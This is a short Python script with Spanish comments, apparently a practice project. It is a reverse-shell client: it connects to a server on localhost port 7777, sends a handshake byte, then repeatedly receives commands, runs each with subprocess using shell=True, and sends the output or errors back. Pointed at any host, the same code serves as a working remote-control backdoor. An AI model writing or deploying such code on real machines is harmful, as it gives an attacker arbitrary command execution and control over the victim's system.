import socket
import subprocess 

def main():
    cliente = socket.socket()

    try:
        cliente.connect(('localhost', 7777)) # Intento conectarme al server que estoy disponibilizando
        sending_object = bytes("1", encoding='utf-8')
        print(f'Object to send: {sending_object}')
        cliente.send(sending_object) # Envió el parametro que espera el servidor para permitirme interactuar con el

        while True:
            c = cliente.recv(1024)
            comando = subprocess.Popen(
                c,
                shell = True,
                stdout = subprocess.PIPE,
                stderr= subprocess.PIPE,
            )
            # print("Superada esta parte del comando!!!")
            #if comando.stderr.read() != "":
            # print(f"Resultado del cliente: {comando.stderr.read()}")
            # print(type(comando.stderr.read()))
            # cliente.send(f"Error de comando: \n {comando.stderr.read()}")
            #else:
            stdout_data, stderr_data = comando.communicate()

            if stderr_data:
                # Envía el error si ocurrió alguno
                print(f"Resultado del cliente (error): {stderr_data.decode()}")
                cliente.send(stderr_data)
            else:
                # Envía la salida del comando
                print(f"Resultado del cliente (stdout): {stdout_data.decode()}")
                cliente.send(stdout_data)

    except Exception as e:
        print("Se arrojó una excepcion!!!")
        print(e)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()